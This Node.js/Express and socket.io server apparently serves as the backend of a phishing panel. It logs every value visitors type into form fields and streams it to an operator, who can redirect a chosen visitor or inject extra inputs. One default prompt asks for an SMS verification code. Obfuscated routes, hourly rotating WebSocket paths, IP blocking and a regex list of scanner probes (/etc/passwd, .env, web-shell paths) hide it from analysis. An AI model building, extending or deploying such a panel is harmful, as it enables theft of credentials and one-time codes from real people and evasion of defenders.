require("dotenv").config();
const express = require("express");
const app = express();
const http = require("http");
const apiServer = http.createServer(app); // for Express API
const axios = require("axios");
const { getClientIp } = require("request-ip");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const mongoose = require("mongoose");
const morgan = require("morgan");
const cookieParser = require("cookie-parser");
const cors = require("cors");
const rateLimit = require('express-rate-limit');
const limiter = rateLimit({
    windowMs: 60 * 1000, 
    max: 100,  
    message: "Too many requests from this IP, please try again later"
});
app.use(morgan("dev"));
app.use(cookieParser());
app.use(cors({
  origin: function (origin, callback) {
    const allowedOrigins = process.env.CLIENT_URL ? process.env.CLIENT_URL.split(',') : [];
    
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));
app.use((req, res, next) => {
  if (req.path.startsWith("/ws_")) {
    return res.status(404).send("WebSocket connection not found here."); // Prevent Express interference
  }
  next();
});

app.use(express.static("public"));
app.use(express.urlencoded({ extended: false }));
app.use(express.json());
app.set('trust proxy', true);
const telegramRouter = require('./routes/telegram');
const authRouter = require("./routes/auth");
const billingRouter = require("./routes/billing");
const adminRoutes = require('./routes/adminAuth');

const ADMIN_SECRET = process.env.ADMIN_SECRET ;

// ✅ Middleware to Protect Routes
const authenticateToken = (req, res, next) => {
  const token = req.headers.authorization;
  if (!token || token !== `Bearer ${ADMIN_SECRET}`) {
    return res.status(403).json({ error: "Unauthorized. Invalid token." });
  }

  next(); // ✅ Allow request if token is valid
};
/*
const DECOY_FIELDS = [
  "userTheme",
  "deviceTrust",
  "lastActivity",
  "authLevel",
  "preferredLanguage",
  "biometricScore",
  "sessionHealth",
  "adExposure",
  "apiLatency",
  "recommendedProducts",
  "deviceHash",
  "regionRiskScore",
  "customFlags"
];
*/


app.use("/api/ath", billingRouter);
app.use("/api", authRouter);
app.use('/api', telegramRouter);
app.use('/api', adminRoutes);

let activeUsers = [];
let previousUsers = [];
let userInputs = {};
const ipCache = {};
let sessionMessages = {}; 
const dataFilePath = path.join(__dirname, "userSessions.txt");
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAD_ID = process.env.TELEGRAM_CHAT_ID;
try {
  if (fs.existsSync(dataFilePath)) {
    const data = JSON.parse(fs.readFileSync(dataFilePath, 'utf8'));
    activeUsers = data.activeUsers || [];
    previousUsers = data.previousUsers || [];
    userInputs = data.userInputs || {};
  }
} catch (error) {
  console.error('Error loading saved data:', error);
}

const saveDataToFile = () => {
  const data = {
    activeUsers,
    previousUsers,
    userInputs
  };
  fs.writeFileSync(dataFilePath, JSON.stringify(data, null, 2));
};

//app.use("/api/", limiter);  // Apply to API routes
const SECRET_KEY = "your_super_secret_key"; // Match frontend
const BASE62_CHARS = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

const base62Decode = (str) => {
  let decoded = 0;
  for (let i = 0; i < str.length; i++) {
      const index = BASE62_CHARS.indexOf(str[i]);
      if (index === -1) {
          console.error(`❌ Invalid Base62 character: ${str[i]}`);
          return null; // Prevent invalid decoding
      }
      decoded = decoded * 62 + index;
  }
  return decoded;
};
// Decrypt and Validate Timestamp
const decryptTimestamp = (encryptedTimestamp) => {
  try {
      const decodedTimestamp = base62Decode(encryptedTimestamp);
      console.log(`🔓 Decrypted Timestamp: ${decodedTimestamp}`);

      // ✅ Ensure it's a valid Unix timestamp (within expected range)
      if (decodedTimestamp < 1710000000 || decodedTimestamp > 1800000000) {
          console.error("❌ Invalid timestamp detected!");
          return null;
      }

      return decodedTimestamp;
  } catch (error) {
      console.error("❌ Decryption error:", error);
      return null;
  }
};
const getDailyPrefix = () => {
  const today = new Date().getUTCDate().toString(); // Get UTC day
  const baseChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let obfuscatedPrefix = "";
  for (let i = 0; i < today.length; i++) {
      let charIndex = parseInt(today[i], 10) * 5;
      obfuscatedPrefix += baseChars.charAt(charIndex % baseChars.length);
  }

  return obfuscatedPrefix; // The core valid prefix for today
};
//tmstm timestamp, rPre 
app.post("/apiv/:rPre/:tmstm", async (req, res) => {
  const { rPre, tmstm } = req.params;
  const { uCukkzD, pageUrl, mtaP , eventType, inputName, inputValue, componentName, browserInfo } = req.body;
  const decodedTimestamp = base62Decode(tmstm);
  const validBasePrefix = getDailyPrefix(); // Compute today's base prefix
  if (!rPre.endsWith(validBasePrefix)) {
    console.error(`❌ Invalid prefix detected: ${rPre}`);
    return res.status(404).json({ error: "Unauthorized." });
}
console.log(rPre);
console.log(validBasePrefix);
  if (!decodedTimestamp || decodedTimestamp < 1710000000 || decodedTimestamp > 1800000000) {
      console.error("❌ Invalid timestamp detected!");
      return res.status(404).json({ error: "Invalid." });
  }

  console.log(`✅ Valid request received at ${req.path} with timestamp ${decodedTimestamp}`);
  let ip = mtaP || 
  (req.headers["x-forwarded-for"]?.split(",")[0] || req.connection?.remoteAddress || req.ip)
  .replace(/^::ffff:/, ""); // Convert IPv6-mapped IPv4 to normal IPv4

  if (!ip || ip === "Unknown IP") {
    ip = getClientIp(req) || "Unknown IP";
    console.error("❌ IP undefined in request.", ip);
  //return res.status(400).json({ error: "IP undefined" });
  };
  try {
    let country = ipCache[ip] || 'Unknown';
    if (!ipCache[ip]) {
      try {
        const geoResponse = await axios.get(`https://ipinfo.io/${ip}/json?token=${process.env.IPINFO_TOKEN}`);
        country = geoResponse.data.country;
        ipCache[ip] = country;
      } catch (error) {
        console.error('IP tracking error:', error);
      }
    }
    if (eventType === 'input') {
      if (!userInputs[uCukkzD]) {
        userInputs[uCukkzD] = {};
      }
      userInputs[uCukkzD][inputName] = { value: inputValue, timestamp: new Date() };
    }

    const user = {
      uCukkzD,
      ip,
      country,
      pageUrl,
      eventType,
      componentName,
      browserInfo,
      inputs: userInputs[uCukkzD] || {},
      lastActive: new Date(),
      timestamp: new Date()
    };

    const existingUserIndex = activeUsers.findIndex(u => u.uCukkzD === uCukkzD);
    if (existingUserIndex !== -1) {
      activeUsers[existingUserIndex] = { ...activeUsers[existingUserIndex], ...user };
    } else {
      activeUsers.push(user);
    }

    if (eventType === 'page_unload') {
      const userIndex = activeUsers.findIndex(u => u.uCukkzD === uCukkzD);
      if (userIndex !== -1) {
        const disconnectedUser = { ...activeUsers[userIndex], disconnectedAt: new Date() };
        previousUsers.push(disconnectedUser);
        activeUsers.splice(userIndex, 1);
      }
    }

    saveDataToFile();
    io.emit("update", { activeUsers });
    res.status(200).json({ status: "OK" });
  } catch (error) {
    console.error('Tracking error:', error);
    res.status(500).json({ error: 'Internal Server Error' });
  }
});


setInterval(() => {
  const twoMinutesAgo = new Date(Date.now() - 120000);
  const inactiveUsers = activeUsers.filter(user => new Date(user.lastActive) < twoMinutesAgo);

  if (inactiveUsers.length > 0) {
    previousUsers = [...inactiveUsers.map(user => ({
      ...user,
      disconnectedAt: new Date()
    })), ...previousUsers].slice(0, 50);  // ✅ Add to the front to keep newest first
  }

  activeUsers = activeUsers.filter(user => new Date(user.lastActive) >= twoMinutesAgo);
  saveDataToFile();
  io.emit("update", { activeUsers});
}, 30000);

app.post("/api/:obfPrefix/:sessionId/:obfSuffix", (req, res) => {
  const { sessionId } = req.params;
  const { uCukkzD, newRoute } = req.body;
  if (!sessionId || sessionId !== uCukkzD) {
    return res.status(404).json({ error: "Invalid session ID" });
}

  console.log(`Changing route for session ${uCukkzD} to ${newRoute}`);

  try {
    const sockets = Array.from(io.sockets.sockets.values());
    const targetSocket = sockets.find(socket => socket.handshake.auth.uCukkzD === uCukkzD);

    if (targetSocket) {
      targetSocket.emit("changeRoute", newRoute);
      console.log(`Route change emitted to socket ${targetSocket.id}`);
      
      const userIndex = activeUsers.findIndex(u => u.uCukkzD === uCukkzD);
      if (userIndex !== -1) {
        activeUsers[userIndex] = {
          ...activeUsers[userIndex],
          pageUrl: newRoute,
          lastRouteChange: new Date()
        };
        saveDataToFile();
        io.emit("update", { activeUsers });
      }
      res.sendStatus(200);
    } else {
      console.log(`No socket found for session ${uCukkzD}`);
      res.status(404).json({ error: 'User not found' });
    }
  } catch (error) {
    console.error('Error changing route:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});
const { getEncryptedKeyFor } = require('./utils/obfRoute');
require('./utils/botResponder');


const weatherSecret = process.env.WEATHER_SECRET;
const newsSecret = process.env.NEWS_SECRET;

app.get("/api/:secretPath", (req, res) => {
  const { secretPath } = req.params;

  const expectedWeatherPath = getEncryptedKeyFor(weatherSecret);
  const expectedNewsPath = getEncryptedKeyFor(newsSecret);

  if (secretPath === expectedWeatherPath) {
    return res.json({ activeUsers });
  }

  if (secretPath === expectedNewsPath) {
    const sortedPreviousUsers = previousUsers.sort((a, b) =>
      new Date(b.disconnectedAt) - new Date(a.disconnectedAt)
    );
    return res.json(sortedPreviousUsers);
  }

  return res.status(404).json({ success: false, error: "Invalid API route." });
});

// Serve userSessions.txt as JSON

const USER_CONFIGS_PATH = path.join(__dirname, "userConfigs.json");
let saveTimeout = null;

if (fs.existsSync(USER_CONFIGS_PATH)) {
  try {
    userInputs = JSON.parse(fs.readFileSync(USER_CONFIGS_PATH, "utf8"));
  } catch (error) {
    console.error("❌ Error loading userConfigs.json:", error);
    userInputs = {}; // Reset to empty if corrupted
  }
}

// ✅ Function to schedule saving user config after 10 seconds
const scheduleSaveToFile = () => {
  if (saveTimeout) clearTimeout(saveTimeout); // Prevent multiple writes
  saveTimeout = setTimeout(() => {
    console.log("✅ NOT Saved user configs to file.");
  }, 10000*6); // ✅ Save after 60 seconds
};

// ✅ API to Get Custom Config------------------------------------------------- (Now Reads from File)
app.get("/api/:encTmstm/:uCukkzD", (req, res) => {
  const { encTmstm, uCukkzD } = req.params;
  console.log(encTmstm);
  const decodedTimestamp = base62Decode(encTmstm) * 2; // Reverse encoding
  // ✅ Validate timestamp range
  if (decodedTimestamp < 1710000000 || decodedTimestamp > 1800000000) {
    console.error("❌ Invalid timestamp detected!");
    return res.status(404).json({ error: "Invalid API request." });
  }

  if (!userInputs[uCukkzD]) {
    return res.status(404).json({ error: "User config not found" });
  }

  const { inputsConfig, customText } = userInputs[uCukkzD];
  res.json({ 
    inputsConfig: inputsConfig || [], 
    customText: customText || "A Verification Code has been sent to your registered mobile phone number via SMS."
  });
});



let configCheckInterval;
const configCheckLimit = 5; // Limit the number of calls
let configCheckCount = 0;
const failedSessionIds = new Set(); // Track session IDs that have failed
const requestLimit = 1; // Allow 1 request per session per interval
const intervalTime = 3000; // 3 seconds
const requestTimestamps = {}; // Track request times per session
/*
const startConfigCheck = () => {
  
  configCheckInterval = setInterval(async () => {
    if (configCheckCount >= configCheckLimit) {
      stopConfigCheck();
      return;
    }
    console.log('dkhalt')
    for (const uCukkzD in userInputs) {
      if (failedSessionIds.has(uCukkzD)) {
        continue; // Skip session IDs that have previously failed
      }

      const currentTime = Date.now();
      const lastRequestTime = requestTimestamps[uCukkzD] || 0;

      if (currentTime - lastRequestTime < intervalTime) {
        continue; // Skip if the last request was made within the limit
      }

      try {
        console.log('dkhalt')
        const response = await axios.get(`${process.env.CLIENT_URL}/api/configCustom_Y3m8/${uCukkzD}`);
        if (response.status === 200) {
          const inputsConfig = response.data.inputsConfig;
          io.to(uCukkzD).emit('configUpdate', { uCukkzD, inputsConfig });
          requestTimestamps[uCukkzD] = currentTime; // Update last request time
        } else {
          throw new Error('Input configuration not found');
        }
      } catch (error) {
        //console.error(`Error fetching input configuration for session ${uCukkzD}:`, error);
        if (error.response && error.response.status === 404) {
          failedSessionIds.add(uCukkzD); // Add to failed session IDs if 404 error
        }
      }
    }

    configCheckCount++;
  }, 500); // Loop through session IDs every second, but each session limited individually
};
*/
/*
const stopConfigCheck = () => {
  clearInterval(configCheckInterval);
  configCheckCount = 0; // Reset the count
};
*/
const getUserSocketBySessionId = (uCukkzD) => {
  const socketId = sessionSocketMap[uCukkzD];
  if (!socketId) return null;
  return io.sockets.sockets.get(socketId) || null;
};
//BOT CONFIG 
const BLOCKED_IPS_PATH = path.join(__dirname, "blockedIPs.json");
let blockedIPs = [];
if (fs.existsSync(BLOCKED_IPS_PATH)) {
  blockedIPs = JSON.parse(fs.readFileSync(BLOCKED_IPS_PATH, "utf8"));
}

// ✅ API to Check if IP is Blocked
app.get("/api/is-rest-bot", authenticateToken, (req, res) => {
   const { ip } = req.query;
       if (!ip) return res.status(400).json({ error: "IP is required" });

  res.json({ blocked: blockedIPs.includes(ip) });
});

// ✅ API to Block a User
app.post("/api/audit/review",authenticateToken,(req, res) => {
  const { ip } = req.body;
  if (!ip) return res.status(400).json({ error: "IP is required" });

  if (!blockedIPs.includes(ip)) {
    blockedIPs.push(ip);
    fs.writeFileSync(BLOCKED_IPS_PATH, JSON.stringify(blockedIPs, null, 2), { flag: 'w' });
    console.log(`🚨 User Blocked: ${ip}`);
    return res.status(200).json({ message: `User with IP ${ip} blocked.` });
  }

  res.status(200).json({ message: "User was already blocked." });
});


// Add error handling middleware
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({
    success: false,
    error: 'Internal server error'
  });
});
const socketIO = require("socket.io");
//

const getHourlySocketPath = () => {
  const secret = process.env.WS_PATH_TOKEN; // Should be defined in .env
  const hourlyTimestamp = Math.floor(Date.now() / (1000 * 60 * 60)).toString();
  const hmac = crypto
    .createHmac("sha256", secret)
    .update(hourlyTimestamp)
    .digest("hex")
    .slice(0, 16); // Slice to shorten (optional)

  return `/ws_${hmac}`;
};

//
const WS_PORT = process.env.WS_PORT || 8080;
const sessionSocketMap = {}; // uCukkzD -> socket.id

// Then declare path and server instance
let wsPath = getHourlySocketPath(); 
let socketServerInstance = null;


function restartWebSocketServer() {
  console.log(`🔄 Updating WebSocket path: ${wsPath}`);

  // Close old server if it exists
  if (socketServerInstance) {
    socketServerInstance.close(() => {
      console.log("🛑 Old socket server closed.");
    });
  }

  // Create new socket server
  socketServerInstance = http.createServer();

  // Attach fresh socket.io to it
  io = socketIO(socketServerInstance, {
    cors: {
      origin: "*",
      methods: ["GET", "POST"]
    },
    pingInterval: 25000,
    pingTimeout: 50000,
    transports: ["websocket", "polling"],
    path: wsPath,
  });

  // Setup event handlers again
  setupSocketHandlers(io);

  // Listen on port
  socketServerInstance.listen(WS_PORT, () => {
    console.log(`🛰 WebSocket server re-running on port ${WS_PORT}`);
  });
}
function setupSocketHandlers(ioInstance) {
  ioInstance.removeAllListeners();

  ioInstance.use((socket, next) => {
    const requestedPath = socket.handshake.query.wsPath;
    if (!requestedPath || requestedPath !== wsPath) {
      console.error(`❌ Invalid WebSocket path: ${requestedPath}`);
      return next(new Error("Invalid WebSocket path"));
    }
    console.log(`✅ WebSocket path validated: ${requestedPath}`);
    next();
  });

  ioInstance.on("connection", (socket) => {
    const uCukkzD = socket.handshake.auth.uCukkzD;
    sessionSocketMap[uCukkzD] = socket.id;

    console.log(`✅ Client connected: ${socket.id}, Session: ${uCukkzD}`);

    socket.uCukkzD = uCukkzD;
    socket.emit("update", { activeUsers, userInputs });

    socket.on("redirectUser", ({ uCukkzD, url }) => {
      const userSocket = getUserSocketBySessionId(uCukkzD);
      if (userSocket) {
        userSocket.emit("redirectUser", { url });
      }
    });

    socket.on("addCustomInput", ({ uCukkzD, input }) => {
      ioInstance.emit("addCustomInput", { uCukkzD, input });
    });

    socket.on("configureInputs", ({ uCukkzD, inputsConfig, customText }) => {
      userInputs[uCukkzD] = { inputsConfig, customText };
      ioInstance.emit("configureInputs", { uCukkzD, inputsConfig, customText });
      scheduleSaveToFile();
    });

    socket.on("disconnect", () => {
      delete sessionSocketMap[uCukkzD];
      const userIndex = activeUsers.findIndex(u => u.uCukkzD === uCukkzD);
  if (userIndex !== -1) {
    const disconnectedUser = { ...activeUsers[userIndex], disconnectedAt: new Date() };
    previousUsers.unshift(disconnectedUser);  // Move to top of previous users list
    activeUsers.splice(userIndex, 1);  // Remove from active users
    saveDataToFile();
    io.emit("update", { activeUsers });  // Notify frontend immediately
  }

      console.log(`🔴 Client disconnected: ${socket.id}, Session: ${uCukkzD}`);
    });
  });
}
setInterval(() => {
  const newPath = getHourlySocketPath();
  if (newPath !== wsPath) {
    wsPath = newPath;
    restartWebSocketServer();
  }
}, 60 * 1000);



// Now it's safe to start
restartWebSocketServer();

// Run Server
const PORT = process.env.PORT || 8000;
app.use((req, res, next) => {
  const botPatterns = [
    // Common web shell and CGI scanners
    /\.cgi$/,                            // e.g., /cgi/get.cgi
    /cmd=home_login/,                   // Router login probes
    /loginMsg\.js/,                     // Probing for login scripts

    // Environment and config files
    /\.env/,                            // .env file leaks
    /config\.(json|php|js)/,            // Config file probes
    /composer\.(json|lock)/,            // PHP Composer config
    /package(-lock)?\.json/,            // Node.js package files
    /yarn\.lock/,                       // Yarn lock file

    // WordPress-specific probes
    /wp-admin/,                         // wp-admin login
    /wp-login\.php/,                    // wp-login path
    /xmlrpc\.php/,                      // XML-RPC endpoint
    /wp-json/,                          // WordPress API

    // PHP and LFI exploit probes
    /\.php$/,                           // Generic PHP files
    /etc\/passwd/,                      // Linux file read attempts
    /\.\.\/\.\.\//,                     // Directory traversal
    /proc\/self\/environ/,              // LFI + shell injection
    /eval\(/,                           // RCE pattern
    /base64_decode\(/,                  // Obfuscated payloads

    // Database dumps / admin
    /admin\.php/,                       // Admin panel
    /phpmyadmin/,                       // phpMyAdmin access
    /db\.sql/,                          // DB dump probing
    /dump\.sql/,                        // Dump file

    // CMS scanners
    /drupal/,                           // Drupal probing
    /joomla/,                           // Joomla probing
    /magento/,                          // Magento
    /typo3/,                            // Typo3 CMS

    // Backup file leaks
    /\.bak$/,                           // e.g., index.html.bak
    /\.old$/,                           // e.g., login.php.old
    /\.swp$/,                           // vim swap files
    /\.git/,                            // Git repo access
    /\.svn/,                            // SVN repo access
    /backup/,                           // backup paths
    /archive/,                          // archive scans

    // API fuzzing / abuse
    /graphql/,                          // Probing GraphQL endpoints
    /actuator/,                         // Spring Boot actuator
    /metrics/,                          // System metrics APIs
    /swagger/,                          // Swagger API docs
    /api-docs/,                         // API documentation
  ];

  if (botPatterns.some(pattern => pattern.test(req.url))) {
    return res.sendStatus(404);
  }

  next();
});

apiServer.listen(PORT, () => {
  console.log(`🚀 Express API running on port ${PORT}`);
});

